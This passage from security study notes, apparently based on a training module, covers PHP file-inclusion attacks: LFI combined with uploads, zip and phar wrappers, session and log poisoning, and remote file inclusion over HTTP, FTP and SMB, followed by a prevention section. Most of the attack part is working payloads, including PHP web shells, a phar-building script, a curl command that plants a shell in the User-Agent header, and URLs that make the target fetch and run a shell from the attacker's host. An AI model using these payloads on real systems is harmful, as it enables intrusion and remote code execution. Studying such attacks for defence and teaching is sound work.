    - With the uploaded file path at hand, all we need to do is to include the uploaded file in the LFI vulnerable function, and the PHP code should get executed
    - `http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id`
    - **Note:** To include to our uploaded file, we used `./profile_images/` as in this case the LFI vulnerability does not prefix any directories before our input. In case it did prefix a directory before our input,then we simply need to `../` out of that directory and then use our URL path, as we learned in previous sections.
    
    ## **Zip Upload**
    
    - There are a couple of other PHP-only techniques that utilize PHP wrappers to achieve the same goal
    - These techniques may become handy in some specific cases where the above technique does not work
    - We can utilize the [zip](https://www.php.net/manual/en/wrappers.compression.php) wrapper to execute PHP code
    - `This wrapper isn't enabled by default`, so this method may not always work
    
    ```bash
    $ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
    ```
    
    **Note:** Even though we named our zip archive as (shell.jpg), some upload forms may still detect our file as a zip archive through content-type tests and disallow its upload, so this attack has a higher chance of working if the upload of zip archives is allowed.
    
    - Once we upload the `shell.jpg` archive, we can include it with the `zip` wrapper as (`zip://shell.jpg`), and then refer to any files within it with `#shell.php` (URL encoded)
    - `http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id`
    
    **Note:** We added the uploads directory (`./profile_images/`) before the file name, as the vulnerable page (`index.php`) is in the main directory.
    
    ## **Phar Upload**
    
    - We can use the `phar://` wrapper to achieve a similar result
    
    ```php
    <?php
    $phar = new Phar('shell.phar');
    $phar->startBuffering();
    $phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
    $phar->setStub('<?php __HALT_COMPILER(); ?>');
    
    $phar->stopBuffering();
    ```
    
    - This script can be compiled into a `phar` file that when called would write a web shell to a `shell.txt` sub-file, which we can interact with
    - We can compile it into a `phar` file and rename it to `shell.jpg`
    
    ```bash
    $ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
    ```
    
    - Once we upload it to the web application, we can simply call it with `phar://` and provide its URL path, and then specify the phar sub-file with `/shell.txt` (URL encoded) to get the output of the command we specify with (`&cmd=id`)
    
    **Note:** There is another (obsolete) LFI/uploads attack worth noting, which occurs if file uploads is enabled in the PHP configurations and the `phpinfo()` page is somehow exposed to us. However, this attack is not very common, as it has very specific requirements for it to work (LFI + uploads enabled + old PHP + exposed phpinfo()). If you are interested in knowing more about it, you can refer to [This Link](https://insomniasec.com/cdn-assets/LFI_With_PHPInfo_Assistance.pdf).
    
- Log Poisoning
    
    We have seen in previous sections that if we include any file that contains PHP code, it will get executed, as long as the vulnerable function has the `Execute` privileges. The attacks we will discuss in this section all rely on the same concept: Writing PHP code in a field we control that gets logged into a log file (i.e. `poison`/`contaminate` the log file), and then include that log file to execute the PHP code. For this attack to work, the PHP web application should have read privileges
    over the logged files, which vary from one server to another.
    
    **PHP Session Poisoning**
    
    - Most PHP web applications utilize `PHPSESSID` cookies,
    which can hold specific user-related data on the back-end, so the web
    application can keep track of user details through their cookies
    - These details are stored in `session` files on the back-end, and saved in `/var/lib/php/sessions/` on Linux and in `C:\Windows\Temp\` on Windows
    - The name of the file that contains our user's data matches the name of our `PHPSESSID` cookie with the `sess_` prefix
    - For example, if the `PHPSESSID` cookie is set to `el4ukv0kqbvoirg7nkp4dncpk3`, then its location on disk would be `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`
    - The first thing we need to do in a PHP Session Poisoning attack is
    to examine our PHPSESSID session file and see if it contains any data we can control and poison
    - Let's try include this session file through the LFI vulnerability and view its contents
    - `http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`
    
    **Note:** As you may easily guess, the cookie value will differ from one session to another, so you need to use the 
    cookie value you find in your own session to perform the same attack.
    
    - We can see that the session file contains two values: `page`, which shows the selected language page, and `preference`, which shows the selected language * The `preference` value is not under our control, as we did not specify it anywhere and must be automatically specified
    - However, the `page` value is under our control, as we can control it through the `?language=` parameter
    - Let's try setting the value of `page` a custom value (e.g. `language parameter`) and see if it changes in the session file
    
    ```
    http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
    ```
    
    - This time, the session file contains `session_poisoning` instead of `es.php`, which confirms our ability to control the value of `page` in the session file
    - Our next step is to perform the `poisoning` step by writing PHP code to the session file
    - We can write a basic PHP web shell by changing the `?language=` parameter to a URL encoded web shell
    
    ```
    http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
    ```
    
    - `http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id`
    
    **Note**: To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten with `/var/lib/php/sessions sess_nhhv8i0o6ua4g88bkdl9u1fdsd` after our last inclusion. Ideally, we would use the poisoned web shell to write a permanent web shell to the web directory, or send a reverse 
    shell for easier interaction.
    
    **Server Log Poisoning**
    
    - Both `Apache` and `Nginx` maintain various log files, such as `access.log` and `error.log`
    - The `access.log` file contains various information about all requests made to the server, including each request's `User-Agent` header
    - As we can control the `User-Agent` header in our requests, we can use it to poison the server logs as we did above
    - Once poisoned, we need to include the logs through the LFI vulnerability, and for that we need to have `read-access` over the logs
    - `Nginx` logs are readable by low privileged users by default (e.g. `www-data`), while the `Apache` logs are only readable by users with high privileges (e.g. `root`/`adm` groups)
    - However, in older or misconfigured `Apache` servers, these logs may be readable by low-privileged users
    - By default, `Apache` logs are located in `/var/log/apache2/` on Linux and in `C:\xampp\apache\logs\` on Windows, while `Nginx` logs are located in `/var/log/nginx/` on Linux and in `C:\nginx\log\` on Windows
    - However, the logs may be in a different location in some cases, so we may use an [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) to fuzz for their locations
    - `http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log`
    - The log contains the `remote IP address`, `request page`, `response code`, and the `User-Agent` header
    - As mentioned earlier, the `User-Agent` header is controlled by us through the HTTP request headers, so we should be able to poison this value
    
    **Tip:** Logs tend to be huge, and loading 
    them in an LFI vulnerability may take a while to load, or even crash the
     server in worst-case scenarios. So, be careful and efficient with them 
    in a production environment, and don't send unnecessary requests.
    
    - To do so, we will use `Burp Suite` to intercept our earlier LFI request and modify the `User-Agent` header to `Apache Log Poisoning`
    
    **Note:** As all requests to the server get logged, we can poison any request to the web application, and not necessarily the LFI one as we did above.
    
    - Also possible with cURL
    
    ```
    $ curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>'
    ```
    
    - As the log should now contain PHP code, the LFI vulnerability should execute this code, and we should be able to gain remote code execution
    
    **Tip:** The `User-Agent` header is also shown on process files under the Linux `/proc/` directory. So, we can try including the `/proc/self/environ` or `/proc/self/fd/N` files
     (where N is a PID usually between 0-50), and we may be able to perform 
    the same attack on these files. This may become handy in case we did not
     have read access over the server logs, however, these files may only be
     readable by privileged users as well.
    
    - Finally, there are other similar log poisoning techniques that we may utilize on various system logs, depending on which logs we have read access over
        - `/var/log/sshd.log`
        - `/var/log/mail`
        - `/var/log/vsftpd.log`
    
    We should first attempt reading these logs through LFI, 
    and if we do have access to them, we can try to poison them as we did above. For example, if the `ssh` or `ftp` services
    are exposed to us, and we can read their logs through LFI, then we can try logging into them and set the username to PHP code, and upon including their logs, the PHP code would execute. The same applies the `mail` services,
    as we can send an email containing PHP code, and upon its log inclusion, the PHP code would execute. We can generalize this technique to any logs that log a parameter we control and that we can read through the LFI vulnerability.
    
- Remote File Inclusion (RFI)
    - In some cases, we may also be able to include remote files "[Remote File Inclusion (RFI)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion)", if the vulnerable function allows the inclusion of remote URLs
        - Enumerating local-only ports and web applications (i.e. SSRF)
        - Gaining remote code execution by including a malicious script that we host
    
    *The [Server-side Attacks](https://academy.hackthebox.com/module/details/145) module covers various `SSRF` techniques, which may also be used with RFI vulnerabilities*
    
    **Local vs. Remote File Inclusion**
    
    - Almost any RFI vulnerability is also an LFI vulnerability, as any function that allows including remote URLs usually also allows including local ones
    - LFI may not necessarily be an RFI
        1. The vulnerable function may not allow including remote URLs
        2. You may only control a portion of the filename and not the entire protocol wrapper (ex: `http://`, `ftp://`, `https://`)
        3. The configuration may prevent RFI altogether, as most modern web servers disable including remote files by default
    
    **Verify RFI**
    
    - Considered dangerouse practice to include remote URLs
    - Usually disabled by default
    - Any remote URL inclusion in PHP would require the `allow_url_include` setting to be enabled
    
    ```
    $ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
    
    allow_url_include = On
    ```
    
    - However, this may not always be reliable, as even if this setting is enabled, the vulnerable function may not allow remote URL inclusion to
    begin with
    - So, a more reliable way to determine whether an LFI vulnerability is also vulnerable to RFI is to `try and include a URL`, and see if we can get its content
    - At first, `we should always start by trying to include a local URL` to ensure our attempt does not get blocked by a firewall or other security measures (`http://127.0.0.1:80/index.php`)
    - `http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php`
    - As we can see, the `index.php` page got included in the
    vulnerable section (i.e. History Description), so the page is indeed
    vulnerable to RFI, as we are able to include URLs
    - Furthermore, the `index.php` page did not get included as source code text but got executed and rendered as PHP, so the
    vulnerable function also allows PHP execution, which may allow us to
    execute code if we include a malicious PHP script that we host on our
    machine
    - We also see that we were able to specify port `80` and get the web application on that port
    - If the back-end server hosted any other local web applications (e.g. port `8080`), then we may be able to access them through the RFI vulnerability by applying SSRF techniques on it
    
    **Note:** It may not be ideal to include the 
    vulnerable page itself (i.e. index.php), as this may cause a recursive 
    inclusion loop and cause a DoS to the back-end server.
    
    ## **Remote Code Execution with RFI**
    
    - First step is to create a malicious script in the language of the web application (e.g PHP)
    
    ```
    $ echo '<?php system($_GET["cmd"]); ?>' > shell.php
    ```
    
    - Host the script and include it through the RFI
    - It is a good idea to listen on a common HTTP port like `80` or `443`, as these ports may be whitelisted in case the vulnerable web application has a firewall preventing outgoing connections
    - We may host the script through an FTP service or an SMB service
    
    ## **HTTP**
    
    ```
    $ sudo python3 -m http.server <LISTENING_PORT>
    Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...
    ```
    
    - We can include our local shell through RFI, like we did earlier, but using `<OUR_IP>` and our `<LISTENING_PORT>`
    - Specifiy the command that should be executed with `&cmd=id`
    - `http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id`
    
    ```
    $ sudo python3 -m http.server <LISTENING_PORT>
    Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...
    
    SERVER_IP - - [SNIP] "GET /shell.php HTTP/1.0" 200 -
    ```
    
    **Tip:** We can examine the connection on our machine to ensure the request is being sent as we specified it. For 
    example, if we saw an extra extension (.php) was appended to the request, then we can omit it from our payload
    
    ## **FTP**
    
    - We may also host our script through the FTP protocol
    
    ```
    $ sudo python -m pyftpdlib -p 21
    
    [SNIP] >>> starting FTP server on 0.0.0.0:21, pid=23686 <<<
    [SNIP] concurrency model: async
    [SNIP] masquerade (NAT) address: None
    [SNIP] passive ports: None
    ```
    
    - This may also be useful in case http ports are blocked by a firewall or the `http://` string gets blocked by a WAF
    - To include our script, we can repeat what we did earlier, but use the `ftp://` scheme in the URL
    - `http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id`
    
    
    
    - By default, PHP tries to authenticate as an anonymous user
    - If the server requires valid authentication, then the credentials can be specified in the URL
    
    ```
    $ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
    ...SNIP...
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    ```
    
    **SMB**
    
    - If the vulnerable web application is hosted on a Windows server
    (which we can tell from the server version in the HTTP response
    headers), then we do not need the `allow_url_include` setting to be enabled for RFI exploitation, as we can utilize the SMB protocol for the remote file inclusion
    - This is because Windows treats files on remote SMB servers as normal files, which can be referenced directly with a UNC path
    - We can spin up an SMB server using `Impacket's smbserver.py`, which allows anonymous authentication by default
    
    ```
    $ impacket-smbserver -smb2support share $(pwd)
    Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
    
    [*] Config file parsed
    [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
    [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
    [*] Config file parsed
    [*] Config file parsed
    [*] Config file parsed
    ```
    
    - Now, we can include our script by using a UNC path (e.g. `\\<OUR_IP>\shell.php`), and specify the command with (`&cmd=whoami`)
    - `http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\shell.php&cmd=whoami`
    
    
    
    - However, we must note that this technique is `more likely to work if we were on the same network`, as accessing remote SMB servers over the internet may be disabled by default, depending on the Windows server configurations
- Prevention
    
    **File Inclusion Prevention**
    
    The most effective thing we can do to reduce file 
    inclusion vulnerabilities is to avoid passing any user-controlled inputs
     into any file inclusion functions or APIs. The page should be able to 
    dynamically load assets on the back-end, with no user interaction 
    whatsoever. Furthermore, in the first section of this module, we 
    discussed different functions that may be utilized to include other 
    files within a page and mentioned the privileges each function has. 
    Whenever any of these functions is used, we should ensure that no user 
    input is directly going into them. Of course, this list of functions is 
    not comprehensive, so we should generally consider any function that can
     read files.
    
    In some cases, this may not be feasible, as it may require
     changing the whole architecture of an existing web application. In such
     cases, we should utilize a limited whitelist of allowed user inputs, 
    and match each input to the file to be loaded, while having a default 
    value for all other inputs. If we are dealing with an existing web 
    application, we can create a whitelist that contains all existing paths 
    used in the front-end, and then utilize this list to match the user 
    input. Such a whitelist can have many shapes, like a database table that
     matches IDs to files, a `case-match` script that matches names to files, or even a static json map with names and files that can be matched.
    
    Once this is implemented, the user input is not going into
     the function, but the matched files are used in the function, which 
    avoids file inclusion vulnerabilities.
    
    **Preventing Directory Traversal**
    
    If attackers can control the directory, they can escape 
    the web application and attack something they are more familiar with or 
    use a `universal attack chain`. As we have discussed throughout the module, directory traversal could potentially allow attackers to do any of the following:
    
    - Read `/etc/passwd` and potentially find SSH Keys or know valid user names for a password spray attack
    - Find other services on the box such as Tomcat and read the `tomcat-users.xml` file
    - Discover valid PHP Session Cookies and perform session hijacking
    - Read current web application configuration and source code
    
    The best way to prevent directory traversal is to use your
     programming language's (or framework's) built-in tool to pull only the 
    filename. For example, PHP has `basename()`, which will read 
    the path and only return the filename portion. If only a filename is 
    given, then it will return just the filename. If just the path is given,
     it will treat whatever is after the final / as the filename. The 
    downside to this method is that if the application needs to enter any 
    directories, it will not be able to do it.
    
    If you create your own function to do this method, it is 
    possible you are not accounting for a weird edge case. For example, in 
    your bash terminal, go into your home directory (cd ~) and run the 
    command `cat .?/.*/.?/etc/passwd`. You'll see Bash allows for the `?` and `*` wildcards to be used as a `.`. Now type `php -a` to enter the PHP Command Line interpreter and run `echo file_get_contents('.?/.*/.?/etc/passwd');`. You'll see PHP does not have the same behaviour with the wildcards, if you replace `?` and `*` with `.`,
     the command will work as expected. This demonstrates there is an edge 
    cases with our above function, if we have PHP execute bash with the `system()` function,
     the attacker would be able to bypass our directory traversal 
    prevention. If we use native functions to the framework we are in, there
     is a chance other users would catch edge cases like this and fix it 
    before it gets exploited in our web application.
    
    Furthermore, we can sanitize the user input to recursively remove any attempts of traversing directories, as follows:
    
    ```
    while(substr_count($input, '../', 0)) {
        $input = str_replace('../', '', $input);
    };
    ```
    
    As we can see, this code recursively removes `../` sub-strings, so even if the resulting string contains `../` it would still remove it, which would prevent some of the bypasses we attempted in this module.
    
    **Web Server Configuration**
    
    Several configurations may also be utilized to reduce the 
    impact of file inclusion vulnerabilities in case they occur. For 
    example, we should globally disable the inclusion of remote files. In 
    PHP this can be done by setting `allow_url_fopen` and `allow_url_include` to Off.
    
    It's also often possible to lock web applications to their
     web root directory, preventing them from accessing non-web related 
    files. The most common way to do this in today's age is by running the 
    application within `Docker`. However, if that is not an 
    option, many languages often have a way to prevent accessing files 
    outside of the web directory. In PHP that can be done by adding `open_basedir = /var/www` in the php.ini file. Furthermore, you should ensure that certain potentially dangerous modules are disabled, like [PHP Expect](https://www.php.net/manual/en/wrappers.expect.php) [mod_userdir](https://httpd.apache.org/docs/2.4/mod/mod_userdir.html).
    
    If these configurations are applied, to should prevent 
    accessing files outside the web application folder, so even if an LFI 
    vulnerability is identified, its impact would be reduced.
    
    **Web Application Firewall (WAF)**
    
    The universal way to harden applications is to utilize a Web Application Firewall (WAF), such as `ModSecurity`.
     When dealing with WAFs, the most important thing to avoid is false 
    positives and blocking non-malicious requests. ModSecurity minimizes 
    false positives by offering a `permissive` mode, which will 
    only report things it would have blocked. This lets defenders tune the 
    rules to make sure no legitimate request is blocked. Even if the 
    organization never wants to turn the WAF to "blocking mode", just having
     it in permissive mode can be an early warning sign that your 
    application is being attacked.
    
    Finally, it is important to remember that the purpose of 
    hardening is to give the application a stronger exterior shell, so when 
    an attack does happen, the defenders have time to defend. According to 
    the [FireEye M-Trends Report of 2020](https://content.fireeye.com/m-trends/rpt-m-trends-2020),
     the average time it took a company to detect hackers was 30 days. With 
    proper hardening, attackers will leave many more signs, and the 
    organization will hopefully detect these events even quicker.
    
    It is important to understand the goal of hardening is not
     to make your system un-hackable, meaning you cannot neglect watching 
    logs over a hardened system because it is "secure". Hardened systems 
    should be continually tested, especially after a zero-day is released 
    for a related application to your system (ex: Apache Struts, RAILS, 
    Django, etc.). In most cases, the zero-day would work, but thanks to 
    hardening, it may generate unique logs, which made it possible to 
    confirm whether the exploit was used against the system or not.

## Source
Original note: `_raw/Web attacks/Web Attacks/LFI.md`
